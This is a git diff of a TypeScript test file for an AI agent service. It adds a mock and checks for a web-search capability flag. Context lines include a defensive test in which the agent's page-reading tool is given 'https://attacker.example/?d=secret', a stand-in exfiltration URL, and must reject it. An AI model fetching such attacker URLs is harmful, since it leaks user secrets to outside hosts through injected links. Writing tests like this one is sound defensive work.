@@ -154,7 +154,7 @@ vi.mock("../ai-providers/service", () => ({
 	aiProvidersService: aiProvidersServiceMock,
 }));
 vi.mock("../web-access/credentials", () => ({
-	webAccessService: { resolve: vi.fn(async () => null) },
+	webAccessService: { resolve: vi.fn(async () => null), canSearch: vi.fn(() => false) },
 }));
 vi.mock("../web-access/service", () => ({
 	searchWeb: vi.fn(),
@@ -408,6 +408,14 @@ describe("agentService.messages.send", () => {
 			vi.mocked(buildAgentTools).mock.calls[0]?.[0].handlers.readPage("https://attacker.example/?d=secret", signal),
 		).rejects.toThrow("Read only retrieved URLs");
 		expect(readPage).not.toHaveBeenCalled();
+
+		// The server's SearXNG gives the assistant web search without a web connection.
+		expect(vi.mocked(buildAgentTools).mock.calls[0]?.[0]).toMatchObject({ externalSearch: false });
+		const { webAccessService } = await import("../web-access/credentials");
+		vi.mocked(webAccessService.canSearch).mockReturnValueOnce(true);
+		await send();
+		expect(webAccessService.canSearch).toHaveBeenLastCalledWith(false);
+		expect(vi.mocked(buildAgentTools).mock.calls.at(-1)?.[0]).toMatchObject({ externalSearch: true });
 
 		// A link the user wrote still reads, however the sentence around it ends or the model spells it.
 		await send(undefined, "Tailor it to https://jobs.example.com/role-42.");
